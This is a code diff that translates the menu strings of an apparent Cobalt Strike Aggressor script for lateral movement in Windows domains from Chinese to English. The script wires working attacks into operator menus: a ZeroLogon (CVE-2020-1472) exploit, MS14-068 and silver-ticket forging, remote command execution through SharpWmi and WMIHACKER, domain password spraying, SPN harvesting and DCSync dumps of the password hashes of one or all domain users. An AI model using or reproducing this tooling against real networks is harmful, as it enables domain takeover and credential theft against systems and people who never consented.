@@ -1,39 +1,39 @@
-menu "☆ 横向移动" {
+menu "Lateral movement" {
 
-    menu "IPC 连接"{
-		item "查看本机开启的共享" {
-			blog($1, "\c9========== 查看开启的共享 ==========");
-			bshell($1, "net share");
+    menu "IPC Connections" {
+        item "View the shares opened on this machine" {
+            blog($1, "\c9========== View open shares ==========");
+            bshell($1, "net share");
+        }
+        item "View the shares opened on the specified host" {
+            blog($1, "\c9========== Close the specified share ==========");
+            prompt_text("Target host IP?", "", lambda({ bshell(@ids, "net view \\\\$1"); }, @ids => $1));
+        }
+        item "View connection (local connection to other machines)" {
+            blog($1, "\c9========== View connection (local connection to other machines) ==========");
+            bshell($1, "net use");
 		}
-		item "查看指定主机开启的共享" {
-			blog($1, "\c9========== 关闭指定共享 ==========");
-			prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net view \\\\$1");  }, @ids => $1));
-		}
-		item "查看连接 (本机连接其他机器)" {
-			blog($1, "\c9========== 查看连接(本机连接其他机器) ==========");
-			bshell($1, "net use");
-		}
-		item "查看连接 (其他机器连接本机)" {
-			blog($1, "\c9========== 查看连接(其他机器连接本机) ==========");
+		item "Check the connection (other machines connect to this machine))" {
+			blog($1, "\c9========== Check the connection (other machines connect to this machine)) ==========");
 			bshell($1, "net session");
 		}
-        item "与指定主机建立 IPC 连接" {
-            blog($1, "\c9========== 与指定主机建立IPC连接 ==========");
+        item "Establish an IPC connection with the specified host" {
+            blog($1, "\c9========== Establish an IPC connection with the specified host ==========");
             $bid = $1['@'];
-            $dialog = dialog("与指定主机建立IPC连接", %(bid => $bid), &net_ipc);
-            dialog_description($dialog, "此功能与指定主机建立IPC连接");
-            drow_text($dialog, "ip", "目标主机IP:  ");
-            drow_text($dialog, "username", "用户名:  ");
-            drow_text($dialog, "password", "密码:  ");
-            dbutton_action($dialog, "确定");
+            $dialog = dialog("Establish an IPC connection with the specified host", %(bid => $bid), &net_ipc);
+            dialog_description($dialog, "This function establishes an IPC connection with the specified host");
+            drow_text($dialog, "ip", "Target HostIP:  ");
+            drow_text($dialog, "username", "User Name:  ");
+            drow_text($dialog, "password", "Password.  ");
+            dbutton_action($dialog, "Determine");
             dialog_show($dialog);
         }
         sub net_ipc {
             bshell($bid, "net use \\\\$3['ip'] /u:$3['username'] $3['password']");
         }
-        item "删除与指定主机建立的IPC连接" {
-            blog($1, "\c9========== 删除与目标ip建立的IPC连接 ==========");
-            prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net use \\\\$1 /del");  }, @ids => $1));
+        item "Delete the IPC connection established with the specified host" {
+            blog($1, "\c9========== Delete the IPC connection established with the target ip ==========");
+            prompt_text("Target host IP?", "", lambda({ bshell(@ids, "net use \\\\$1 /del");  }, @ids => $1));
         }
     }    
     item "NTLM hash"{
@@ -57,9 +57,9 @@ menu "☆ 横向移动" {
 	item "ZeroLogonBOF" {
 		blog($1, "\c9=========== ZeroLogonBOF ==========");
         $dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "xstark.sec" , NetBios => "DCX" , arch => "x64") ,&ZeroLogon);
-        dialog_description($dialog,"ZeroLogon（CVE-2020-1472）攻击可能导致主机脱域！参考：https://github.com/rsmudge/ZeroLogon-BOF");
-        drow_text($dialog,"Domain","域名:");
-        drow_text($dialog,"NetBios","域控 NetBios:");
+        dialog_description($dialog,"ZeroLogon（CVE-2020-1472）The attack may cause the host to go off domain! Reference：https://github.com/rsmudge/ZeroLogon-BOF");
+        drow_text($dialog,"Domain","Domain Name:");
+        drow_text($dialog,"NetBios","domain control NetBios:");
         drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
         dbutton_action($dialog,"Exploit");
         dialog_show($dialog);
@@ -113,12 +113,12 @@ menu "☆ 横向移动" {
 
 
     menu "SharpWmi" {
-        item "上传 SharpWmi" {
-			blog($1, "\c9=========== 上传 SharpWmi ==========");
+        item "Upload SharpWmi" {
+			blog($1, "\c9=========== Upload SharpWmi ==========");
             $bid = $1;
-            $dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
-            drow_text($dialog, "UploadPath",  "上传路径: "); 	
-            dbutton_action($dialog, "上传");
+            $dialog = dialog("Upload sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+            drow_text($dialog, "UploadPath",  "Upload path: "); 	
+            dbutton_action($dialog, "Upload");
             dialog_show($dialog);
     }
     sub sharpwmi_up {
@@ -128,17 +128,17 @@ menu "☆ 横向移动" {
         
 
     }
-    item "运行 SharpWmi" {
-		blog($1, "\c9=========== 运行 SharpWmi ==========");
+    item "Run SharpWmi" {
+		blog($1, "\c9=========== Run SharpWmi ==========");
         $bid = $1['@'];
-        $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
-        dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
+        $Dialog = dialog("Run sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+        dialog_description($Dialog, "This is a tool based on port 135 for lateral movement, with the function of executing commands and uploading files, executing commands through wmi and data transfer through calls, currently it only supports uploading files below 512kb, because the length of resetting each value cannot exceed 512kb.");
         drow_text($Dialog, "ip", "ip: ");
         drow_text($Dialog, "username", "username: ");
         drow_text($Dialog, "password", "password: ");
         drow_text($Dialog, "type", "cmd/upload: ");
         drow_text($Dialog, "cmd/path", "cmd/path: ");
-        dbutton_action($Dialog, "运行");
+        dbutton_action($Dialog, "Run");
         dialog_show($Dialog);
     }
 
@@ -151,8 +151,8 @@ menu "☆ 横向移动" {
         $cmd/path = $3['cmd/path'];
         bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
     } 
-    item "删除 SharpWmi" {
-		blog($1, "\c9=========== 删除 SharpWmi ==========");
+    item "Delete SharpWmi" {
+		blog($1, "\c9=========== Delete SharpWmi ==========");
         local('$bid');
         foreach $bid ($1){
             bshell($1, "del /f /s /q sharpwmi.exe");
@@ -163,14 +163,14 @@ menu "☆ 横向移动" {
     menu "Pass The Ticket" {
         item "MS14-068 (KB3011780)" {
 			blog($1, "\c9=========== Ms14-068 (KB3011780) ==========");
-            show_message("使用此方法会清除本地凭据!!");
-            $dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "xstark.sec" , user => "administrator" , password => "Admin2012" , user_sid => "域用户SID" , DC_name => "域控") , &Ms14_068);
-            dialog_descrption($dialog,"微软PAC检验不严格导致的漏洞");
-            drow_text($dialog,"Domain","域名:");
-            drow_text($dialog,"user","用户:");
-            drow_text($dialog,"password","密码:");
-            drow_text($dialog,"user_sid","用户SID:");
-            drow_text($dialog,"DC_name","域控名:");
+            show_message("Using this method will clear the local credentials!!!");
+            $dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "xstark.sec" , user => "administrator" , password => "Admin2012" , user_sid => "Domain User SID" , DC_name => "domain control") , &Ms14_068);
+            dialog_descrption($dialog,"Microsoft PAC inspection is not strict enough to cause the vulnerability");
+            drow_text($dialog,"Domain","Domain Name:");
+            drow_text($dialog,"user","User:");
+            drow_text($dialog,"password","Password:");
+            drow_text($dialog,"user_sid","User SID:");
+            drow_text($dialog,"DC_name","Domain Control Name:");
             dbutton_action($dialog,"Exploit");
             dialog_show($dialog);   
         }
@@ -178,13 +178,13 @@ menu "☆ 横向移动" {
         item "Silver-ticket" {
 			blog($1, "\c9=========== Silver-ticket ==========");
             $dialog = dialog("DomainInfo", %( bid => $1["@"] , Domain => "xstark.sec" , Domain_sid => "xxx" , Target_name => "WIN-Q1E9PO4969I" , target_hash => "xxx" , user => "administrator" , server => "LDAP" ) ,&Silver_DCSync);
-            dialog_description($dialog,"利用白银票据来获得对某一服务的访问权限");
-            drow_text($dialog,"Domain","域名:");
-            drow_text($dialog,"Domain_sid","域SID:");
-            drow_text($dialog,"Target_name","目标机器名:");
-            drow_text($dialog,"target_hash","目标机器Hash:");
-            drow_text($dialog,"user","用户:");
-            drow_combobox($dialog,"server","服务:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
+            dialog_description($dialog,"Using a silver ticket to gain access to a service");
+            drow_text($dialog,"Domain","Domain Name:");
+            drow_text($dialog,"Domain_sid","Domain SID:");
+            drow_text($dialog,"Target_name","Target machine name:");
+            drow_text($dialog,"target_hash","Target machine Hash:");
+            drow_text($dialog,"user","User:");
+            drow_combobox($dialog,"server","Services:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
             dbutton_action($dialog,"Exploit");
             dialog_show($dialog);
 
@@ -192,31 +192,28 @@ menu "☆ 横向移动" {
 
         item "Import_ticket" {
 			blog($1, "\c9=========== Import_ticket ==========");
-            $dialog = dialog("导如票据文件于此会话中", %( bid => $1["@"] , file => "") ,lambda({
+            $dialog = dialog("Import the ticket file in this session", %( bid => $1["@"] , file => "") ,lambda({
                 bkerberos_ticket_use($3["bid"],$3["file"])
             }));
-            dialog_description($dialog,"导入票据文件");
-            drow_file($dialog,"file","票据文件:");
+            dialog_description($dialog,"Importing ticket files");
+            drow_file($dialog,"file","Note Documents:");
             dbutton_action($dialog,"Exploit");
             dialog_show($dialog);
         }
     }
 
     menu "WMIHACKER" {
-        item "上传WMIHACKER" {
-			blog($1, "\c9=========== 上传WMIHACKER ==========");
+        item "Upload WMIHACKER" {
+			blog($1, "\c9=========== Upload WMIHACKER ==========");
             $bid = $1;
-            $dialog = dialog("上传WMIHACKER", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &WMIHACKER);
-            drow_text($dialog, "UploadPath",  "上传路径: "); 	
-            dbutton_action($dialog, "上传");
+            $dialog = dialog("Upload WMIHACKER", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &WMIHACKER);
+            drow_text($dialog, "UploadPath",  "Upload path: "); 	
+            dbutton_action($dialog, "Upload");
             dialog_show($dialog);
     }
     sub WMIHACKER {
-
         bcd($bid, $3['UploadPath']);
             bupload($bid, script_resource("/scripts/LateMovement/WMIHACKER.vbs"));
-        
-
     }
     item "cmd" {
 		blog($1, "\c9=========== cmd ==========");
@@ -228,7 +225,7 @@ menu "☆ 横向移动" {
         drow_text($Dialog, "pass", "pass: ");
         drow_text($Dialog, "command", "command: ");
         drow_text($Dialog, "GETRES", "GETRES: ");
-        dbutton_action($Dialog, "运行");
+        dbutton_action($Dialog, "Run");
         dialog_show($Dialog);
     }
     sub WMIHACKER_cmd {
@@ -251,7 +248,7 @@ menu "☆ 横向移动" {
         drow_text($Dialog, "pass", "pass: ");
         drow_text($Dialog, "command", "command: ");
         drow_text($Dialog, "GETRES", "GETRES: ");
-        dbutton_action($Dialog, "运行");
+        dbutton_action($Dialog, "Run");
         dialog_show($Dialog);
     }
     sub WMIHACKER_cmd {
@@ -274,7 +271,7 @@ menu "☆ 横向移动" {
         drow_text($Dialog, "pass", "pass: ");
         drow_text($Dialog, "localpath", "localpath: ");
         drow_text($Dialog, "remotepath", "remotepath: ");
-        dbutton_action($Dialog, "运行");
+        dbutton_action($Dialog, "Run");
         dialog_show($Dialog);
     }
     sub WMIHACKER_upload{
@@ -297,7 +294,7 @@ menu "☆ 横向移动" {
         drow_text($Dialog, "pass", "pass: ");
         drow_text($Dialog, "localpath", "localpath: ");
         drow_text($Dialog, "remotepath", "remotepath: ");
-        dbutton_action($Dialog, "运行");
+        dbutton_action($Dialog, "Run");
         dialog_show($Dialog);
     }
     sub WMIHACKER_download {
@@ -314,14 +311,14 @@ menu "☆ 横向移动" {
 
     }
 
-    item "枚举域用户密码" {
-		blog($1, "\c9=========== 枚举域用户密码 ==========");
+    item "Enumerate domain user passwords" {
+		blog($1, "\c9=========== Enumerate domain user passwords ==========");
         $bid = $1['@'];
         $dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
-        dialog_description($dialog, "枚举域内用户密码（Pass2User指定单个密码-枚举，User2Pass指定单个用户-爆破）。");
+        dialog_description($dialog, "Enumerate user passwords in the domain (Pass2User specifies individual password-enumeration, User2Pass specifies individual user-blasting).");
         drow_text($dialog, "content", "content:  ");		
         drow_combobox($dialog, "type", "type", @("-User2Pass", "-Pass2User"));
-        dbutton_action($dialog, "运行");
+        dbutton_action($dialog, "Run");
         dialog_show($dialog);
     }
     sub SharpDomainSpray {
@@ -329,40 +326,39 @@ menu "☆ 横向移动" {
         bexecute_assembly($bid, script_resource("/scripts/LateMovement/SharpDomainSpray.exe"), $arg);
     } 
 
-    item "获取 SPN" {
-		blog($1, "\c9=========== 获取 SPN ==========");
+    item "Get SPN" {
+		blog($1, "\c9=========== Get SPN ==========");
         bexecute_assembly($1, script_resource("/scripts/LateMovement/SPNSearcher.exe"), "");
     }
 
-    menu "获取域用户 hash" {
-        item "指定用户" {
-		    blog($1, "\c9=========== 指定用户 ==========");
-            $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
-            dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
+    menu "Get Domain Users hash" {
+        item "Designated User" {
+		    blog($1, "\c9=========== Designated User ==========");
+            $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "Domain Name" , user => "User") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+            dialog_description($dialog,"Use Mimikatz to get the password hash of a given user");
             drow_text($dialog,"bid","Bid:");
             drow_text($dialog,"domain","Domain:");
             drow_text($dialog,"user","User:");
             dbutton_action($dialog,"Exploit");
             dialog_show($dialog);
         }
-        item "全部用户" {
-			blog($1, "\c9=========== 全部用户 ==========");
-            $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
-            dialog_description($dialog, "获取全部用户的密码Hash");
+        item "All Users" {
+			blog($1, "\c9=========== All Users ==========");
+            $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "Domain Name") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+            dialog_description($dialog, "Get the password hash of all users");
             drow_text($dialog, "domain","Domain:");
             dbutton_action($dialog,"Exploit");
             dialog_show($dialog);
-
         }
     }
 
-    item "获取域共享" {
-		blog($1, "\c9=========== 获取域共享 ==========");
+    item "Get Domain Shares" {
+		blog($1, "\c9=========== Get Domain Shares ==========");
         $bid = $1['@'];
-        $dialog = dialog("获取域共享", %(bid => $bid), &SharpShares);
-        dialog_description($dialog, "列出当前域中所有计算机的网络共享信息,也可以将所有计算机名称转换为IP地址。");
+        $dialog = dialog("Get Domain Shares", %(bid => $bid), &SharpShares);
+        dialog_description($dialog, "List the network share information of all computers in the current domain, and also convert all computer names to IP addresses.");
         drow_combobox($dialog, "type", "type:", @("ips","shares"));		
-        dbutton_action($dialog, "运行");
+        dbutton_action($dialog, "Run");
         dialog_show($dialog);
     }
     sub SharpShares {
